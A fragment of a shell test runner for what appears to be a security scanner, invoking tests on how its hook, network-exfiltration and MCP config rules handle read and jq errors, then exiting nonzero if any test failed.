csa_test_run test_every_grep_rule_error_is_rc2_and_no_match_stays_silent || _csa_failed=$((_csa_failed + 1))
csa_test_run test_a_match_found_before_a_read_error_is_still_a_finding || _csa_failed=$((_csa_failed + 1))
csa_test_run test_hook001_critical_survives_a_mid_read_failure_through_the_engine || _csa_failed=$((_csa_failed + 1))
csa_test_run test_a_failed_target_write_keeps_the_walk || _csa_failed=$((_csa_failed + 1))
csa_test_run test_scanner003_respects_the_scan_focus || _csa_failed=$((_csa_failed + 1))
csa_test_run test_failed_rule_targets_mktemp_is_scanner002_for_the_rule || _csa_failed=$((_csa_failed + 1))
csa_test_run test_failed_mv_of_the_walk_cache_is_scanner002_not_a_skip || _csa_failed=$((_csa_failed + 1))
csa_test_run test_network_exfiltration_read_error_after_a_benign_prefix_is_rc2 || _csa_failed=$((_csa_failed + 1))
csa_test_run test_network_exfiltration_half_match_before_a_read_error_is_rc2 || _csa_failed=$((_csa_failed + 1))
csa_test_run test_mcp_env_var_leak_keeps_a_match_found_before_a_jq_failure || _csa_failed=$((_csa_failed + 1))
csa_test_run test_mcp_missing_auth_keeps_a_name_found_before_a_jq_failure || _csa_failed=$((_csa_failed + 1))

[[ "$_csa_failed" -eq 0 ]] || exit 1
